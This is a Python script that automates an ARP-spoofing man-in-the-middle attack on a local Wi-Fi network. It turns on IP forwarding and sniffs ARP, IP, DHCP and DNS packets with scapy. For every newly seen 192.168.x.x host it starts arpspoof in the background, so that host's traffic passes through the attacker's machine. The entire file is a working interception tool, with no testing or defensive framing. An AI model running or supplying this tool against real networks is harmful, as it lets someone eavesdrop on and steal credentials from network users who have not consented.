#!/usr/bin/env python3
from sys import excepthook
from scapy.all import *
import os
import time
import socket

interface="wlan0"
gateway="192.168.0.254"
os.system('sudo echo 1 > /proc/sys/net/ipv4/ip_forward')
users=['192.168.0.254','192.168.1.1','192.168.0.253']

def CHECK_INTERNET(IP, PORT):
    global MYIP
    try:
        socket.setdefaulttimeout(3)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((IP, PORT))
        MYIP=s.getsockname()[0]
        s.close
        return True
    except socket.error as ex:
        s.close
        return False

def GET_USERS(x):
    # DETECTION DE REQUETE ARP & SPOOFING IP
    try:
        if x.haslayer(ARP):
            ip=str(x[ARP].psrc)
            if not ip in users and "192.168" in ip:
                users.append(ip)
                print('[+] NEW USER DETECTED: '+ip+' [+]')
                os.system('sudo arpspoof -i '+interface+' -c both -t '+ip+' '+gateway+' > /dev/null 2>&1 &')
    except:
        pass
    # DETECTION DE REQUETE IP & SPOOFING IP
    try:
        if x.haslayer(IP):
            ip=str(x[IP].src)
            if not ip in users and "192.168" in ip:
                users.append(ip)
                print('[+] NEW USER DETECTED: '+ip+' [+]')
                os.system('sudo arpspoof -i '+interface+' -c both -t '+ip+' '+gateway+' > /dev/null 2>&1 &')
    except:
        pass
    # DETECTION DE REQUETE DHCP & SPOOFING IP
    try:
        if x.haslayer(DHCP):
            ip=str(x.getlayer(BOOTP).yiaddr)
            if not ip in users and "192.168" in ip:
                users.append(ip)
                print('[+] NEW USER DETECTED: '+ip+' [+]')
                os.system('sudo arpspoof -i '+interface+' -c both -t '+ip+' '+gateway+' > /dev/null 2>&1 &')
    except:
        pass
    # DETECTION DE REQUETE DNS & SPOOFING IP
    try:
        if x.haslayer(DNS):
            ip=str(x[IP].src)
            if not ip in users and "192.168" in ip:
                users.append(ip)
                print('[+] NEW USER DETECTED: '+ip+' [+]')
                os.system('sudo arpspoof -i '+interface+' -c both -t '+ip+' '+gateway+' > /dev/null 2>&1 &')
    except:
        pass

print('[+] ARPSPOOFER STARTED........................[OK]')

while True:
    sniff(iface="wlan0", prn=GET_USERS, timeout=3)
    while not CHECK_INTERNET(gateway,80):
        os.system('clear')
        os.system('sudo killall arpspoof > /dev/null 2>&1 &')
        users=['192.168.0.254','192.168.1.1','192.168.0.253']
